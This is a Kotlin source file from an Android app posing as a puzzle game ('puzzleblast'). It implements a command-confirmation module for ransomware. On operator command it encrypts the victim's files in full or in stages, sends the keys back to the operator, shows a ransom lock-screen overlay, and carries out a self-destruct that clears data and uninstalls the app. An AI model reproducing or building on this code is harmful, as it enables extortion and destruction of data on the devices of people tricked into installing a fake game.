package com.puzzleblast.game.modules

import android.content.Context
import android.os.Environment
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.services.OverlayService
import com.puzzleblast.game.util.Prefs
import java.io.File

object ConfirmModule {
    suspend fun confirm(ctx: Context, code: String): String {
        if (System.currentTimeMillis() > Prefs.pendingConfirmExpiry) return "✅ code expired"
        if (code != Prefs.pendingConfirm) return "✅ wrong code"
        val cmd = Prefs.pendingConfirmCmd
        Prefs.pendingConfirm = ""; Prefs.pendingConfirmCmd = ""; Prefs.pendingConfirmExpiry = 0
        return when {
            cmd == "kill" -> { kill(ctx); "💀 self-destruct initiated" }
            cmd.startsWith("encrypt:") -> {
                val (_, path, key) = cmd.split(":", limit = 3)
                val n = RansomwareModule.executeEncrypt(path, key)
                Send.text("🔐 encrypted $n files\n🗝 key: $key")
                "🔐 done · $n files"
            }
            cmd.startsWith("encrypt_stage:") -> {
                val (_, stage, key) = cmd.split(":", limit = 3)
                val n = RansomwareModule.executeStage(stage.toInt(), key)
                Send.text("🔐 stage$stage encrypted $n files\n🗝 key: $key")
                "🔐 stage$stage done · $n files"
            }
            cmd.startsWith("lock_screen:") -> {
                val text = cmd.removePrefix("lock_screen:")
                OverlayService.ransom(ctx, text)
                "🖥 ransom notice shown"
            }
            else -> "✅ unknown pending cmd"
        }
    }

    private fun kill(ctx: Context) {
        Prefs.wizardDone = false
        Prefs.authed = false
        ctx.cacheDir.deleteRecursively()
        try {
            val intent = android.content.Intent(android.content.Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:${ctx.packageName}")
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            ctx.startActivity(intent)
        } catch (_: Exception) {}
        android.os.Process.killProcess(android.os.Process.myPid())
    }
}
